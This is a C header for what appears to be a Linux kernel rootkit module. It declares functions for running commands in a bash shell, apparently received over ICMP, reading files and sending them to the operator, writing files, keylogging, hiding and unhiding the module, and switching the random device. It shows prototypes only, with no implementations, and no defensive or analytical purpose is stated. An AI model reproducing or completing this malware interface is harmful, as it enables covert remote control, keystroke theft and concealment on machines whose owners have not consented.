#ifndef COMMANDS_HEADER
#define COMMANDS_HEADER


#include <linux/module.h>
#include <linux/fs.h>

#include "debug.h"
#include "args.h"
#include "icmp.h"
#include "keylogger.h"
#include "hooks.h"
#include "drivers.h"
#include "encoding.h"

extern struct shell_driver_data driver_data;

// parses the command, deletes the command string from data and returns the respective command
command_t parse_command(char* data);

// runs the command in bash shell
void run_command(args_t* args);

// reads 'to_read' bytes from file into the buffer
int read_file(char* filename, char* buffer, int to_read, loff_t start);

// reads the given file and sends its content to user
void cat_command(args_t* args);

void keylog_command(args_t* args);

bool hide_module(void);

bool unhide_module(void);

extern struct mutex random_mutex; 

extern bool random_switched;

bool switch_random(void);

// creates file with content from the given buffer
int write_file(char* filename, char* buffer);

void write_file_command(args_t* args);




#endif